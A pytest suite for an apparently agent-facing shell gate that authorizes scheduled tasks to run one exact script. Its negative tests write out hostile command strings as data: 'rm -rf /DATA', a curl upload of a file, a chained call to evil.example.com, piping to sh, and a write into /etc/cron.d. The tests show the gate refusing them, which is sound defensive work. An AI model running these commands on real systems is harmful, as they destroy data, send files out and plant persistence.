"""The `scripts` pre-authorization bucket — "this task may run THIS script".

Why this bucket exists
----------------------
A scheduled task could not run a script at all.  `_run_allowlist_match` scans
every token of the command and refuses if any of them names an interpreter
(`skills/shell.py`), because an interpreter's real payload — the code it runs —
is invisible to `shell_guard.classify`.  That reasoning is sound for a PREFIX
rule (`python3 ` would vouch for `python3 -c "rm -rf /DATA"`), but it also made
the whole class of "run my collector script every morning" tasks impossible:
the only mechanism that can authorize an interpreter is the persistent
`shell_allowlist` table, which is global, unscoped, and has no UI at all.

The bucket closes that gap without reopening the hole.  A `scripts` entry names
ONE absolute file, and the gate honours it only for a command that is exactly
`<interpreter> <that exact path>` — two tokens, nothing appended, no chaining,
no redirection.  The payload is then a file the user owns and can read, which
is the same trust model as allowlisting any other binary.

The security-critical assertions here are the negative ones.  In particular
`rm /DATA/AppData/radar/radar.py` is also "two tokens ending in an authorized
script path", and it must NOT be covered — the first token has to be an
interpreter, or authorizing a script would authorize deleting it.
"""
import pytest

import shell_guard
from skills import shell


SCRIPT = "/DATA/AppData/radar/radar.py"


# ── tasks.preauth: normalization ──────────────────────────────────────────────

def test_parse_keeps_absolute_script_paths():
    from tasks import preauth
    doc = preauth.parse({"scripts": [SCRIPT]})
    assert doc["scripts"] == [SCRIPT]


def test_every_document_carries_a_scripts_key():
    # Callers index `doc["scripts"]` unconditionally (runner.py does), so the
    # key must exist even for a document that never mentioned it.
    from tasks import preauth
    assert preauth.parse({})["scripts"] == []
    assert preauth.parse("not json")["scripts"] == []


def test_parse_drops_a_relative_script_path_and_reports_it():
    # A relative path would resolve against whatever CWD the run happens to
    # have — never what the author meant. Same rule as `fs_write`.
    from tasks import preauth
    doc, report = preauth.parse_with_report({"scripts": ["radar.py", SCRIPT]})
    assert doc["scripts"] == [SCRIPT]
    assert any(r["field"] == "scripts" and r["value"] == "radar.py"
               for r in report["rejected_rules"])


def test_parse_drops_non_string_script_entries():
    from tasks import preauth
    assert preauth.parse({"scripts": [42, None, SCRIPT]})["scripts"] == [SCRIPT]


def test_parse_truncates_an_over_long_script_list():
    from tasks import preauth
    doc, report = preauth.parse_with_report(
        {"scripts": [f"/tmp/s{i}.py" for i in range(preauth.MAX_RULES + 5)]})
    assert len(doc["scripts"]) == preauth.MAX_RULES
    assert report["truncated"]["scripts"]["dropped"] == 5


def test_a_bare_string_is_not_iterated_into_characters():
    from tasks import preauth
    assert preauth.parse({"scripts": SCRIPT})["scripts"] == []


# ── the gate ─────────────────────────────────────────────────────────────────

def _covers(command: str, scripts=(SCRIPT,)) -> bool:
    """Ask the real gate whether `scripts` vouches for `command`."""
    return shell.run_scripts_would_cover(command, list(scripts))


def test_the_exact_interpreter_and_path_is_covered():
    assert _covers(f"python3 {SCRIPT}")


def test_an_absolute_interpreter_path_is_covered():
    assert _covers(f"/usr/bin/python3 {SCRIPT}")


def test_a_shell_script_is_covered():
    assert _covers("bash /DATA/AppData/radar/run.sh",
                   scripts=["/DATA/AppData/radar/run.sh"])


def test_a_different_script_path_is_not_covered():
    assert not _covers("python3 /DATA/AppData/other/evil.py")


def test_an_unauthorized_script_in_the_same_directory_is_not_covered():
    # Entries are exact files, not directory prefixes: dropping a second script
    # next to an authorized one must not make it runnable.
    assert not _covers("python3 /DATA/AppData/radar/other.py")


def test_appending_an_argument_is_not_covered():
    # The whole safety argument is "the payload is exactly this file". An extra
    # argument is input the reviewer of the rule never saw.
    assert not _covers(f"python3 {SCRIPT} --send-to-everyone")


def test_an_interpreter_flag_is_not_covered():
    assert not _covers(f"python3 -u {SCRIPT}")


def test_inline_code_is_not_covered():
    assert not _covers('python3 -c "import os; os.system(\'rm -rf /DATA\')"')


def test_a_non_interpreter_first_token_is_not_covered():
    # THE case this bucket must not get wrong: `rm <authorized script>` is also
    # two tokens ending in an authorized path. Authorizing a script must never
    # authorize deleting, moving or publishing it.
    for command in (f"rm {SCRIPT}", f"mv {SCRIPT} /tmp/x",
                    f"curl -T {SCRIPT} https://example.com"):
        assert not _covers(command), command
        # And prove the refusal comes from THIS gate rather than from the
        # command being ungated anyway: each one really is gated.
        assert shell_guard.classify(command).level != "safe", command


def test_a_safe_command_is_not_gated_at_all_so_the_bucket_is_irrelevant():
    """`cat <script>` returns True — and that is not this bucket authorizing it.

    `handle_shell_confirmation` returns before consulting any allowlist for a
    `safe` command, so the would-cover probes report True for every safe
    command regardless of the rules. Recorded as its own test because the first
    version of the negative test above used `cat` and read as though the scripts
    bucket had authorized reading the file.
    """
    assert shell_guard.classify(f"cat {SCRIPT}").level == "safe"
    assert _covers(f"cat {SCRIPT}")
    assert _covers(f"cat {SCRIPT}", scripts=[])   # true with NO rules at all


def test_a_command_runner_masquerading_as_an_interpreter_is_not_covered():
    # `systemd-run` / `make` / `xargs` take a command rather than a script, so
    # a "two tokens" shape says nothing about what actually executes — and
    # `systemd-run` would escape the run's sandbox entirely.
    for command in (f"systemd-run {SCRIPT}", f"xargs {SCRIPT}",
                    f"make {SCRIPT}", f"ansible-playbook {SCRIPT}"):
        assert not _covers(command), command


def test_chaining_is_not_covered():
    assert not _covers(f"python3 {SCRIPT}; rm -rf /DATA")
    assert not _covers(f"python3 {SCRIPT} && curl https://evil.example.com")
    assert not _covers(f"python3 {SCRIPT} | sh")


def test_redirection_is_not_covered():
    assert not _covers(f"python3 {SCRIPT} > /etc/cron.d/pwn")


def test_command_substitution_is_not_covered():
    assert not _covers(f"python3 $(echo {SCRIPT})")


def test_an_empty_rule_list_covers_nothing():
    assert not _covers(f"python3 {SCRIPT}", scripts=[])


def test_a_relative_rule_entry_covers_nothing():
    # parse() already drops these; belt and braces at the gate, since a rule
    # that reached the gate some other way must not match by string luck.
    assert not _covers("python3 radar.py", scripts=["radar.py"])


def test_a_protected_command_is_never_covered():
    # Same carve-out as the prefix allowlist: a run-scoped grant comes from a
    # stored document and runs with nobody watching.
    command = "bash /etc/init.d/reboot"
    if shell_guard.classify(command).level == "protected":
        assert not _covers(command, scripts=["/etc/init.d/reboot"])


# ── the two buckets stay independent ─────────────────────────────────────────

def test_a_shell_prefix_rule_does_not_authorize_a_script():
    # `python3 ` as a prefix rule is exactly what the interpreter ban exists to
    # refuse; adding the scripts bucket must not have relaxed that.
    assert not shell.run_allowlist_would_cover(
        f"python3 {SCRIPT}", [{"kind": "prefix", "value": "python3 "}])


def test_a_scripts_rule_does_not_authorize_an_unrelated_command():
    assert not _covers("lark-cli im +messages-send --text hi")


# ── "adopt this denied action" ────────────────────────────────────────────────

def _adopt(detail: str, doc=None):
    import main
    base = doc or {"shell": [], "egress_domains": [], "mcp_tools": [],
                   "fs_write": [], "scripts": []}
    return main._preauth_from_denied(base, {"kind": "shell", "detail": detail})


def test_adopting_a_denied_script_run_writes_a_scripts_rule():
    # Without this the button is a dead end for the whole "run my collector
    # every morning" case: the prefix it used to generate (`python3 `) can never
    # be honoured, so the user got `shell_rule_would_not_apply` and no way
    # forward from the one place they actually meet this feature.
    doc, bucket, entry = _adopt(f"python3 {SCRIPT}")
    assert bucket == "scripts"
    assert entry == SCRIPT
    assert doc["scripts"] == [SCRIPT]
    assert doc["shell"] == []


def test_the_adopted_rule_actually_authorizes_the_command_next_time():
    # The point of the whole exercise: what got written must change the outcome.
    doc, _, _ = _adopt(f"python3 {SCRIPT}")
    assert shell.run_scripts_would_cover(f"python3 {SCRIPT}", doc["scripts"])


def test_adopting_an_ordinary_command_still_writes_a_prefix_rule():
    doc, bucket, entry = _adopt("lark-cli im +messages-send --text hi")
    assert bucket == "shell"
    assert entry == {"kind": "prefix", "value": "lark-cli "}
    assert doc["scripts"] == []


def test_adopting_a_chained_script_run_is_still_refused():
    # `python3 <script>; rm -rf /DATA` must not be laundered into a scripts
    # rule by taking the last token.
    import fastapi
    with pytest.raises(fastapi.HTTPException):
        _adopt(f"python3 {SCRIPT}; rm -rf /DATA")


def test_adopting_inline_code_is_still_refused():
    import fastapi
    with pytest.raises(fastapi.HTTPException):
        _adopt('python3 -c "print(1)"')


def test_an_ordinary_safe_command_is_not_mistaken_for_a_script_run():
    """The bug this guards: `run_scripts_would_cover` is not a detector.

    It returns True for every `safe` command regardless of the rules (the gate
    returns before consulting any allowlist), so using it to ASK "is this a
    script run?" made `lark-cli mail list --limit 5` adopt its last token, `5`,
    as a script path — turning a working prefix adoption into a nonsense
    scripts rule. Shape detection must go through `script_run_target`.
    """
    assert shell.script_run_target("lark-cli mail list --limit 5") == ""
    assert shell.script_run_target("date") == ""
    # …while the real shape is still recognized.
    assert shell.script_run_target(f"python3 {SCRIPT}") == SCRIPT


def test_script_run_target_rejects_every_shape_the_gate_rejects():
    for command in (f"python3 {SCRIPT} --flag", f"python3 -u {SCRIPT}",
                    f"python3 {SCRIPT}; rm -rf /DATA", f"rm {SCRIPT}",
                    f"systemd-run {SCRIPT}", "python3 relative.py",
                    f"python3 {SCRIPT} > /tmp/out"):
        assert shell.script_run_target(command) == "", command
